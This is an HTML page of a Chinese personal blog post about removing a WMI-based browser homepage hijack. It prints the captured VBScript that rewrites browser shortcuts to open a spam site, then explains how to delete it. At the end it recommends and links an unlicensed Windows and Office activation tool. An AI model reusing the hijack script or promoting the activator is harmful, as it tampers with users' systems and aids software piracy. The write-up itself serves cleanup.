@@ -1,0 +1,258 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8" />
+  <title>抢救被流氓网站劫持的浏览器主页 | Arlen's Zone</title>
+  <meta name="generator" content="Jekyll" />
+  <meta name="author" content="ArlenLuo" />
+  <meta name="description" content="" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="stylesheet" href="/css/style.css" type="text/css" />
+  <link rel="alternate" type="application/atom+xml" title="Recent Entries" href="/feed.xml" />
+  <link rel="shortcut icon" href="/images/psb.jpg" type="image/x-icon" />
+  <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+  <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+  <!--[if lt IE 9]>
+      <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+      <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+  <![endif]-->
+</head>
+
+<!-- 多说公共JS代码 start (一个网页只需插入一次) -->
+<script type="text/javascript">
+var duoshuoQuery = {short_name:"arlenluo"};
+  (function() {
+    var ds = document.createElement('script');
+    ds.type = 'text/javascript';ds.async = true;
+    ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+    ds.charset = 'UTF-8';
+    (document.getElementsByTagName('head')[0] 
+     || document.getElementsByTagName('body')[0]).appendChild(ds);
+  })();
+</script>
+<!-- 多说公共JS代码 end -->
+<body>
+    <header class="head">
+	<div class="header fn-clear">
+		<section class="header-cnt fn-clear">
+			<div class="logo">
+				<div class="logo-cnt">
+					<h3> &nbsp; </h3>
+				 	<h1><a href="/">Arlen's Zone</a></h1>
+				 	<h3> &nbsp; </h3>
+				 	<h2>如果你是船，漂泊就是你的命运，可别靠岸。——北岛</h2>
+				</div>
+			</div>
+			<nav class="nav">
+				<ul>
+					<li><a href="/" >Home</a></li>
+					<!--<li><a href="/category.html" >Category</a></li>-->
+					<li><a href="/archives.html" >Archives</a></li>
+					<li><a href="/aboutme.html" >About Me</a></li>
+					<!--<li><a href="/feed.xml" target="_blank" >Rss</a></li>-->
+				</ul>
+			</nav>
+		</section>
+	</div>
+</header> 
+  <section id="content">
+    <article id="contenter">
+      <section class="content">
+	<div class="content-cnt fn-clear">
+		<div class="main fn-clear">
+			<article class="entry">
+				<h1 class="title">抢救被流氓网站劫持的浏览器主页</h1>
+               	<p class="meta"><time class="date" pubdate="2017-03-12">12 Mar 2017</time> ·&nbsp;极客志&nbsp;·&nbsp;<!-- By ArlenLuo -->浏览量 <span data-hk-page="current"> - </span><g:plusone size="small"></g:plusone></p>
+               	<p class="description">为什么hao123、2345等网站的老板们就不能文明点呢？</p>
+ 			 	<p>最近重装了一次电脑。尽管什么百度系的软件我都没有下载，Chrome浏览器的主页还是被硬生生劫持了。每次点开后的主页是hao.qquu8.com这个链接，紧接着它会跳向hao123。电脑上原装的其他浏览器（IE和Edge）也是这样，弄得每次打开浏览器就被恶心一下，很是恼火。</p>
+
+<p><img class="img-responsive" src="\images\post6\L1.jpg" alt="L1" /></p>
+
+<p>我们先来看看问题在哪。右键快捷方式查看属性：</p>
+
+<p><img class="img-small" src="\images\post6\L2.jpg" alt="L2" /></p>
+
+<p>哦，原来快捷方式被改了，后面加了一段url。把它删了试试？</p>
+
+<p>还是不行，几分钟后还是被改回来了。</p>
+
+<p>我在很多平台上找了解决办法。有的试了没有效果，重新开机后还是一样的毛病，有的推荐装“管家”，但这种以毒攻毒的办法无异于饮鸩止渴。最后终于有一种靠谱的方法，经过实验和一点修改，完美解决！</p>
+
+<p>主页被劫持的原理是一段通过WMI发起的定时自动运行脚本，WMI（Windows Management Instrumentation）可以理解成Windows系统后台运行的一个事件管理器。为查看WMI事件，先去下载WMITools并安装：<a href="\images\post6\WMITools.exe" target="_blank">WMI工具</a>。</p>
+
+<p>之后打开WMI Event Viewer：</p>
+
+<p><img class="img-responsive" src="\images\post6\L3.jpg" alt="L3" /></p>
+
+<p>点击左上角的笔的图标（Register For Events），在弹出的Connect to namespace的框直接点OK，Login的页面也直接点OK。点开左侧栏的EventFilter，再点击下级目录的项目：</p>
+
+<p><img class="img-responsive" src="\images\post6\L4.jpg" alt="L4" /></p>
+
+<p>在右侧栏右键点击ActiveScriptEventConsumer，并通过view instant properties查看属性：</p>
+
+<p><img class="img-medium" src="\images\post6\L5.jpg" alt="L5" /></p>
+
+<p>在Script Text那一栏我们可以看到这段脚本：</p>
+
+<pre>
+On Error Resume Next
+
+Const link = "http://hao.qquu8.com/?m=yx&amp;r=j"
+Const link360 = "http://hao.qquu8.com/?m=yx&amp;r=j&amp;s=3"
+browsers = "114ie.exe,115chrome.exe,1616browser.exe,2345chrome.exe,2345explorer.exe,360se.exe,360chrome.exe,,avant.exe,baidubrowser.exe,chgreenbrowser.exe,chrome.exe,firefox.exe,greenbrowser.exe,iexplore.exe,juzi.exe,kbrowser.exe,launcher.exe,liebao.exe,maxthon.exe,niuniubrowser.exe,qqbrowser.exe,sogouexplorer.exe,srie.exe,tango3.exe,theworld.exe,tiantian.exe,twchrome.exe,ucbrowser.exe,webgamegt.exe,xbrowser.exe,xttbrowser.exe,yidian.exe,yyexplorer.exe"
+lnkpaths = "C:\Users\Public\Desktop,C:\ProgramData\Microsoft\Windows\Start Menu\Programs,C:\Users\sjtul\Desktop,C:\Users\sjtul\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch,C:\Users\sjtul\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\StartMenu,C:\Users\sjtul\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar,C:\Users\sjtul\AppData\Roaming\Microsoft\Windows\Start Menu\Programs"
+browsersArr = split(browsers,",")
+Set oDic = CreateObject("scripting.dictionary")
+For Each browser In browsersArr
+    oDic.Add LCase(browser), browser
+Next
+lnkpathsArr = split(lnkpaths,",")
+Set oFolders = CreateObject("scripting.dictionary")
+For Each lnkpath In lnkpathsArr
+    oFolders.Add lnkpath, lnkpath
+Next
+Set fso = CreateObject("Scripting.Filesystemobject")
+Set WshShell = CreateObject("Wscript.Shell")
+For Each oFolder In oFolders
+    If fso.FolderExists(oFolder) Then
+        For Each file In fso.GetFolder(oFolder).Files
+            If LCase(fso.GetExtensionName(file.Path)) = "lnk" Then
+                Set oShellLink = WshShell.CreateShortcut(file.Path)
+                path = oShellLink.TargetPath
+                name = fso.GetBaseName(path) &amp; "." &amp; fso.GetExtensionName(path)
+                If oDic.Exists(LCase(name)) Then
+                    If LCase(name) = LCase("360se.exe") Then
+                        oDicShellLink.Arguments = link360
+                    Else
+                        oShellLink.Arguments = link
+                    End If
+                    If file.Attributes And 1 Then
+                        fsoile.Attributes = file.Attributes - 1
+                    End If
+                    oShellLink.Save
+                End If
+            End If
+        Next
+    End If
+Next
+</pre>
+
+<p>终于抓到了幕后黑手。可以看到这是一段VBScript代码，攻击目标涵盖了包括Chrome、360、Firefox、搜狗等30余种常见的浏览器。脚本以浏览器的安装地址为切入点，创建WshShell对象，进而生成植入了流氓网站的快捷方式。360浏览器有限定主页格式，于是这段脚本还特地修饰了流氓网站的链接。唉，流氓至此，也是服了。</p>
+
+<p>查到了源头如何清清除这段造孽的脚本呢？直接在WMI Event Viewer中将_EventFilter.Name="VBScriptKids_filter"右键删掉会被系统拒绝掉，需要去WMI Event Viewer的安装位置，右键以管理员方式运行exe文件才能删掉。之后还要把各个快捷方式都改回不带流氓网站的版本，包括桌面上的、开始菜单里的以及快速访问栏里的快捷方式，其中开始菜单里的快捷方式要去C:\ProgramData\Microsoft\Windows\Start Menu\Programs里改掉。唉，一趟下来真是让人心累，好在最终浏览器摆脱了流氓网站的劫持：</p>
+
+<p><img class="img-responsive" src="\images\post6\L6.jpg" alt="L6" /></p>
+
+<p>当然在这时候，你可以点击之前下载的WMI安装包，把WMI系列工具卸载掉。</p>
+
+<p>想说对百度这家公司的反感度又深了一层。</p>
+
+<p>最后提一下电脑中毒的原因。我分析是前几天用了小马激活这个工具来激活Windows系统，当时并没有激活成功反而还引来了病毒。推荐一款<a href="https://myfreeproject.com/soft/81-kmsauto-net-2016.html" target="_blank">俄罗斯人开发的工具</a>，可以成功激活Windows系统和Office软件，也不会招来一些流氓脚本：<a href="\images\post6\KMSAuto-Net-1.4.9.zip" target="_blank">KMSAuto</a>。</p>
+
+
+                <h4> &nbsp </h4>
+			</article><!-- .entry -->		
+		</div>
+        <div class="aside fn-clear">
+            <div class="box fn-clear">
+	<img src="/images/psb.jpg" alt="about theme"/>
+	<p>Welcome to Arlen's Zone! Here is a place where I write blogs and share ideas. Hope we can make friends with each other! </p>
+</div>
+            <div class="box fn-clear">
+	<h3 class="title"><a href="/category.html">Category</a></h3>
+	<ul>
+	
+	<li>&#8227;
+	<a href="/category.html#极客志" title="极客志" rel="3">极客志 (3)</a>
+	</li>
+	
+	<li>&#8227;
+	<a href="/category.html#随笔集" title="随笔集" rel="3">随笔集 (3)</a>
+	</li>
+	
+	</ul>
+</div>
+            <!-- <div class="box fn-clear">
+	<h3 class="title">GitHub Project</h3>
+	<ul>
+		<li>&#8227;<a href="#">LHT</a></li>
+		<li>&#8227;<a href="#">ColorCode</a></li>
+		<li>&#8227;<a href="www.google.com">Google</a></li>
+		<li>&#8227;<a href="#">Alice</a></li>
+	</ul>
+</div>-->
+            <div class="box fn-clear">
+  <h3 class="title">Recent Visitors</h3>
+  <ul class="ds-recent-visitors" data-num-items="8" data-avatar-size="49" style="margin-top:8px;"></ul>
+</div>
+        </div> 
+        <!-- 多说评论框 start -->
+        <div class="main fn-clear">
+            <div class="ds-thread" data-thread-key="/2017/03/12/DefeatYourBrowser" data-title="抢救被流氓网站劫持的浏览器主页" data-url="/2017/03/12/DefeatYourBrowser"></div>
+        <!-- 多说评论框 end -->
+        <h3> &nbsp </h3>
+            <nav class="pagination-link">
+                
+                
+                <a class="next" href="/2017/01/01/My2016ReadingList" rel="bookmark">2016，我的年度十本书&nbsp;&raquo;</a>
+                
+            </nav>
+        </div>
+	</div>
+</section>
+    </article>
+  </section>
+    <footer class="foot">
+	<div class="foot-cnt fn-clear">
+		<div class="foot-cnt-det fn-clear">
+			<article class="blogroll">
+				<h4 class="title">Blogroll</h4>
+				<ul>
+					<li>&#8227;<a href="https://vangleliu.github.io/">Vangle Liu</a></li>
+					<li>&#8227;<a href="https://zhengwu-blog.github.io/">Wu Zheng</a></li>
+					<li>&#8227;<a href="http://zhuxinqi.space/index.html">Steven Zhu</a></li>
+					<li>&#8227;<a href="https://tianling-blog.github.io/">Tianling</a></li>
+					<!--<li>&#8227;<a href="http://www.jekyllrb.com">Jekyll</a></li>-->
+				</ul>
+			</article>
+			<article class="about">
+				<h4 class="title">GitHub Project</h4>
+				<ul>
+					<li>&#8227;<a href="https://github.com/ArlenLuo/24Game">24 Game</a></li>
+					<li>&#8227;<a href="https://github.com/ArlenLuo/Word-Ladder">Word Ladder</a></li>
+					<li>&#8227;<a href="https://github.com/ArlenLuo/Compression-Tool">Compression Tool</a></li>
+					<li>&#8227;<a href="https://github.com/ArlenLuo/BASIC-Interpreter-on-M4">BASIC Interpreter on M4</a></li>
+				</ul>
+			</article>
+			<article class="follow">
+				<h4 class="title">Follow & Contact Me</h4>
+				<ul>
+					<li><a href="https://github.com/arlenluo" class="ico-github" target="_blank">github</a></li>
+					<li><a href="https://plus.google.com/105274126253221874551" class="ico-google" target="_blank">google</a></li>
+					<li><a href="https://www.linkedin.com/in/arlen-luo-47b0bb127" class="ico-linkedin" target="_blank">linkedin</a></li>
+					<li><a href="mailto:sjtuluo@gmail.com" class="ico-mail">mail</a></li>
+					<li> </li>
+					<li><a href="https://www.facebook.com/luo.jing.773" class="ico-facebook">facebook</a></li>
+					<li><a href="https://www.instagram.com/arlenluo915/" class="ico-ins">instagram</a></li>
+					<li><a href="https://twitter.com/Arlen_Luo" class="ico-twitter">twitter</a></li>
+					<li><a href="/feed.xml" class="ico-rss" target="_blank">rss</a></li>
+					<!--<li><a href="" class="ico-vimeo">vimeo</a></li>
+					<li><a href="#" class="ico-linkedin">linkedin</a></li>
+					<li><a href="#" class="ico-google">google</a></li>
+					<li><a href="#" class="ico-flickr">flickr</a></li>-->
+				</ul>
+			</article>
+		</div>
+	</div>
+	<div class="foot-btn">
+		<div class="foot-btn-det">
+			<p class="copyright">© 2016-2017 ArlenLuo ♪ Powered by Jekyll.</p>
+		</div>
+	</div>
+</footer>
+</body>
+</html>
+
+<!-- 浏览量统计脚本 -->
+<script src="/js/av-mini-0.6.10.js"></script>
+<script src="/js/hit-kounter-lc-0.2.0.js"></script>
